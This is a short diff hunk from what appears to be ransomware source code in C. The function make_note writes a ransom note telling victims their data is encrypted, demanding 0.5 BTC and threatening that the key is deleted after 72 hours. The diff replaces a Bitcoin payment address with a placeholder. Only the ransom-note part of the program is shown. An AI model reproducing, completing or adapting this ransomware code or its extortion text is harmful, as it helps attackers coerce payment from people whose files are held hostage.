@@ -21,7 +21,7 @@ void make_note(void){
     "Only we can provide this decryptor, and only we can restore your data safely.\n\n"
     "Payment instructions:\n"
     "Send 0.5 BTC to the following address:\n"
-    "    1FfmbHfnpaZjKFvyi1okTjJJusN455paPH\n\n"
+    "    0123456789abcdefghijklmnopqrstuvwxyz\n\n"
     "After payment, contact us with your unique ID to receive the decryption tool.\n\n"
     "Warning:\n"
     "- You have 72 hours before your decryption key is permanently deleted.\n"
